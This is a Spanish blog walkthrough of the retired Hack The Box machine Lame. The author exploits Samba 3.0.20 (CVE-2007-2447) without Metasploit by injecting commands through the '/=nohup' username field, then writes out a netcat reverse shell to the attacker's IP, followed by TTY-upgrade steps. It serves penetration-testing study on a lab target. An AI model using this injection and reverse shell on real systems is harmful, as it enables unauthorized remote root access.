---
title: "HTB: Lame – Writeup sin Metasploit (Explotación Samba CVE-2007-2447)"
description: "Resolución de la máquina Lame de Hack The Box sin Metasploit: escaneo de puertos, explotación manual de Samba 3.0.20 (usermap script) y acceso root directo."
pubDate: "2021-11-14"
author: "EVLBYTE"
tags: ["CVE-2007-2447", "HackTheBox", "HTB Lame", "Linux", "OSCP PREP", "Samba", "Sin Metasploit", "TTY Spawn", "WriteUp"]
category: "Ciberseguridad"
heroImage: "/images/2021_11_image.png"
draft: false
---

Esta es una maquina considerada como fácil, ideal para iniciar en el pentest. La máquina Lame de HTB actualmente esta retirada por lo que para poder trabajarla es necesario contar con una suscripción VIP.

![Imagen técnica](/images/2021_11_image.png)

## 1. Preparación del Entorno y Reconocimiento de Red

Iniciamos como siempre organizando nuestro ambiente de trabajo, por lo que crearemos los siguientes directorios: nmap, exploits, vuln y tmp.

He creado para automatizar un script en bash que nos permite crear automáticamente todas las carpetas que normalmente utilizo para las CTF de HTB.

```bash
directorios.sh Lame
```

continuamos entonces con el reconcomiendo, de los puertos expuestos de la maquina Lame de HTB con nuestro script básico pero efectivo. Ingresamos al directorio /home/usuario/Lame/nmap y corremos el siguiente script de nmap:

```bash
nmap -sV -sC 10.10.10.3 -Pn -oX puertos_expuestos.xml
```

luego convertiremos el archivo xml que acabamos de generar en un archivo html para poderlo visualizar, de una forma mas ordenada que nos servirá igualmente para los reportes posteriores.

```bash
sudo xsltproc puertos_expuestos.xml -o puertos_expuestos.html
```

![Imagen técnica](/images/2021_11_image-1.png)

## 2. Análisis de Puertos y Vulnerabilidades (vsftpd y Samba)

Obtenemos como información principal 4 puertos abiertos, expuestos, además de información sobre el servicio y versión de cada uno.

Tenemos disponibles los puertos:

- 21 ftp
- 22 de ssh
- 139 y 445 de SMB.

Verificamos los puertos en orden y encontramos que para el puerto 21 ftp es posible una autenticación como un usuario Anonymous, sin embargo, no hay ningún archivo o directorio sobre la carpeta raíz.

Encontramos además que la versión del servicio de ftp es vsftpd 2.3.4 Buscamos alguna vulnerabilidad y exploits asociados en la base de datos offline de Kali con el siguiente comando:

```bash
searchsploit vsftpd 2.3.4
```

obteniendo los siguientes resultados

![Imagen técnica](/images/2021_11_image-2.png)

Buscamos por internet algún exploit para los resultados que encontramos offline

https://www.exploit-db.com/exploits/49757

encontramos que al ingresar los caracteres ":)" dentro del usuario, nos permite ejecutar comandos remotamente. Al validar el script utilizado encontramos que el mismo ya no funciona pues es probable que halla sido parcheado lo que nos lleva a determinar que esta vulnerabilidad es un RABBIT HOLE puesta a propósito para hacernos perder el tiempo o entretenernos en la vulnerabilidad.

![Imagen técnica](/images/2021_11_image-3.png)

## 3. Explotación de Samba 3.0.20 (CVE-2007-2447) sin Metasploit

Por lo que pasamos a analizar los siguientes puertos vulnerables de samba 139 y 445

![Imagen técnica](/images/2021_11_image-4.png)

Nuevamente encontramos algunas coincidencias, pero como estamos tratando de evitar la utilización de metasploit buscamos en internet si existe algún exploit que podamos utilizar como referencia para entender la vulnerabilidad y utilizarla para generar nuestro propio script o utilizar alguno directamente desde internet. Al examinar el exploit en la web encontramos que es posible ejecutar comandos de forma remota utilizando ciertos caracteres en la autenticación

![Imagen técnica](/images/2021_11_image-5.png)

Es decir, si en la autenticación utilizamos como usuario /=nohup concatenado con un comando este comando se ejecutara de forma remota en el equipo victima

Probemos un ping hacia nuestro equipo atacante, para validar en mi caso la ip del túnel es 10.10.14.14 por lo que ejecutaremos en una consola aparte una escucha de icmp para detectar la ejecución remota.

Para poder conectarnos y ejecutar algún comando desde samba es necesario conectarnos a un recurso compartido, por lo que necesitamos listar las carpetas compartidas, dejando en blanco el password solicitado, y encontramos una carpeta llamada tmp que podemos utilizar.

![Imagen técnica](/images/2021_11_image-6.png)

Agregamos nuestra escucha ICMP sobre la interfaz tun0 en una termina diferente

![Imagen técnica](/images/2021_11_image-7.png)

Tal como indicamos utilizamos el logon vulnerable para ejecutar un comando en la maquina victima

![Imagen técnica](/images/2021_11_image-8.png)

Aunque la conexión nos muestra un error de NT_STATUS_LOGON_FAILURE podemos ver que en la escucha ICMP si se ejecuto el comando PING hacia nuestro host

![Imagen técnica](/images/2021_11_image-9.png)

Por lo que podemos intentar ejecutar una conexión remota hacia nuestro  con una escucha de conexiones remotas sobre el puerto 443

![Imagen técnica](/images/2021_11_image-10.png)

![Imagen técnica](/images/2021_11_image-11.png)

Al ejecutar nc -e /bin/bash 10.10.14.14 443 estamos ejecutando una conexión remota por el puerto tcp 443 desde la maquina victima hacia nuestro equipo atacante.

![Imagen técnica](/images/2021_11_image-12.png)

## 4. Tratamiento de la TTY y Acceso Root

Si ejecutamos el siguiente comando en la consola reversa, podemos formatear la misma para que se abra como bash

```bash
script /dev/null /bin/bash
```

luego presionamos crtl+z para regresar a nuestro equipo sin cerrar la sesión y configuramos lo siguiente

```bash
stty raw -echo; fg
```

y nuevamente nos regresa a la consola que estamos viendo, únicamente tenemos que exportar las las 2 variables de entorno

```bash
export TERM=xterm
```

```bash
export SHELL=bash
```

```bash
reset
```

y con esto tenemos una seudo-consola funcional para poder navegar dentro del equipo vulnerado.

![Imagen técnica](/images/2021_11_image-13.png)

## 5. Captura de Flags (User y Root) y Conclusiones

Utilizando los comandos whoami y pwd obtenemos la carpeta actual y el nombre del usuario con el que ingresamos, ya que la vulnerabilidad en este caso nos da acceso de root, procedemos a buscar las respectivas flags de usuario y root

![Imagen técnica](/images/2021_11_image-14.png)

También podría ser posible cambiar el passwod del usuario makis desde el archivo passwd y utilizarlo para generar una conexión por ssh, y escalar privilegios de root desde el usuario makis

![Imagen técnica](/images/2021_11_image-15.png)

![Imagen técnica](/images/2021_11_image-16.png)

En resumen aprendimos sobre las vulnerabilidades que una mala configuracion en SMB. Esta maquina no fue muy dificil aunque si divertida de investigar como utilizar esta vulnerabilidad sin un utilizar metasploit.

Saludos y nos leemos en una proxima ocacion.
